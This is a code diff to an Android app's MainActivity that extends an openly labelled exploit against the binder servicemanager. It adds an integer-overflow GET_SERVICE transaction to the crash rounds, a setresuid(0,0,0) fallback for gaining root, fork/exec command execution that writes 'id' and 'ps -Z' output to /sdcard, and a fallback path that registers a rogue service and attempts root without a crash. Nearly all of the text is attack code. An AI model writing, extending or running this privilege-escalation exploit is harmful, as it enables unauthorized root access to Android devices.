@@ -76,9 +76,12 @@ public class MainActivity extends AppCompatActivity {
     public static native int nativeSendHugeNameAddService(int fd, String name);
     public static native int nativeSendInvalidOffsets(int fd);
     public static native int nativeSendNullBuffer(int fd);
+    public static native int nativeSendIntegerOverflowGetService(int fd);
     public static native int nativeAddService(int fd, String name);
     public static native int nativeSetUid(int uid);
+    public static native int nativeSetResUid(int uid);
     public static native String nativeExecCommand(String cmd);
+    public static native int nativeForkExec(String cmd);
 
     private ServiceConnection tzConnection = new ServiceConnection() {
         @Override
@@ -210,7 +213,7 @@ public class MainActivity extends AppCompatActivity {
 
         boolean crashed = false;
         int attackCount = 0;
-        while (!crashed && attackCount < 3 && !stopRequested.get()) {
+        while (!crashed && attackCount < 4 && !stopRequested.get()) {
             attackCount++;
             appendLog("[*] Attack round " + attackCount);
 
@@ -230,6 +233,10 @@ public class MainActivity extends AppCompatActivity {
 
             int ret4 = nativeSendNullBuffer(binderFd);
             appendLog("  null buffer -> " + ret4);
+            sleep(200);
+
+            int ret5 = nativeSendIntegerOverflowGetService(binderFd);
+            appendLog("  integer overflow GET_SERVICE -> " + ret5);
             sleep(300);
 
             int newPid = nativeGetServicemanagerPid();
@@ -254,16 +261,30 @@ public class MainActivity extends AppCompatActivity {
                 appendLog("[*] Trying setuid(0)");
                 int uidRet = nativeSetUid(0);
                 appendLog("  setuid(0) -> " + uidRet);
+                if (uidRet != 0) {
+                    int resUidRet = nativeSetResUid(0);
+                    appendLog("  setresuid(0,0,0) -> " + resUidRet);
+                }
                 String idOut = nativeExecCommand("id");
                 appendLog("  id output: " + idOut);
-                nativeExecCommand("echo 'Exploit succeeded' > /sdcard/Download/exploit_result.txt");
-                nativeExecCommand("id >> /sdcard/Download/exploit_result.txt");
+                nativeForkExec("echo 'Exploit succeeded' > /sdcard/Download/exploit_result.txt");
+                nativeForkExec("id >> /sdcard/Download/exploit_result.txt");
+                nativeForkExec("ps -Z >> /sdcard/Download/exploit_result.txt");
                 appendLog("[*] Check /sdcard/Download/exploit_result.txt");
             } else {
                 appendLog("[-] Failed to add service");
             }
         } else {
-            appendLog("[-] servicemanager did not crash, exploit failed");
+            appendLog("[-] servicemanager did not crash, trying fallback exploit");
+            appendLog("[*] Attempting ADD_SERVICE without crash");
+            int addRet = nativeAddService(binderFd, "exploit_fallback");
+            appendLog("  addService returned " + addRet);
+            if (addRet == 0) {
+                appendLog("[+] Service added (fallback)!");
+                nativeSetUid(0);
+                nativeSetResUid(0);
+                nativeForkExec("id > /sdcard/Download/exploit_fallback.txt");
+            }
         }
 
         closeFd(binderFd);
